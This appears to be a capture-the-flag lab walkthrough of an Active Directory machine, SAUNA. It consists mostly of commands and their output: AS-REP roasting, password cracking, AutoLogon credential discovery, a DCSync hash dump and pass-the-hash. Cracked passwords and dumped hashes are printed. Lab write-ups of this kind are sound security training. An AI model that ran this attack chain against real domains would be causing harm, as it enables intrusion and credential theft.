```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-18 15:49 EDT
Nmap scan report for 10.10.10.175
Host is up (0.024s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49689/tcp open  unknown
49697/tcp open  unknown
```
- `nxc smb 10.10.10.175 --users`
`Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)`

- From the about.html page, create a list of users with their first and last names in a file.
- Use usernamer.py to generate a list of possible users using the above file.

- `kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 maybe-unames.txt`
    - `fsmith@EGOTISTICAL-BANK.LOCAL`

- `impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -no-pass -usersfile valid_ad_user`
```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTISTICAL-BANK.LOCAL:90cca7806b399bcbdb5eab43ae6a6577$178ff2411a1b471fd1f8f93c1283c0bec4ee19bc5cb430b487c54724915cd0fbec619455cb8505f57a9fe16d65b7d083dc9d668d3445a1168edbc711b85264d869d895a4d657da136e5c8d671f4c6bf1dba820b315107c7396e698aeddfcd8ab615d3bd2cee9e896145e2afa13fe2a7a44043915a960b0b5817ede9a7322111910e37aab040f5125323945458715334dd98e1bb9f694f2b758348b85e9bdca1e7abc13be886c6a35e0e7583f81a46929f54880e26a80ec7c441ed46df33bc00d48d9f3b1083d42686edc2af3a523360c9752dd82680c65d2f8d6ff0d066ca9385b149d64c6fae47bf6e8b54d73ca840696e476275959c0337eb59b42651b8de2
```

- `john fsmith.hash --wordlist=rockyou.txt`
    - `Thestrokes23`

- running SharpHound.exe

- Running winpeasx64.exe
```
Some AutoLogon credentials were found                                                                                                                                                                          
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager 
    DefaultPassword               :  Moneymakestheworldgoround!
```
- `evil-winrm `
- nothing in net user
- from previous sharphound we see svc_loanmgr has dcsync over admin

```
impacket-secretsdump -outputfile sauna_hashes -just-dc EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:eb7b7f4055c950fe80092c8d7dbac735:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:b4f50520a9dc89dfdb93c49d897ddf6d585c706f5d797d822520bc3ffbd0a19c
SAUNA$:aes128-cts-hmac-sha1-96:2cb835ec6d7c5083214f02275a837f6c
SAUNA$:des-cbc-md5:325443ad02b6a404
[*] Cleaning up... 
```

- Use pass the hash with evil-winrm -Hd
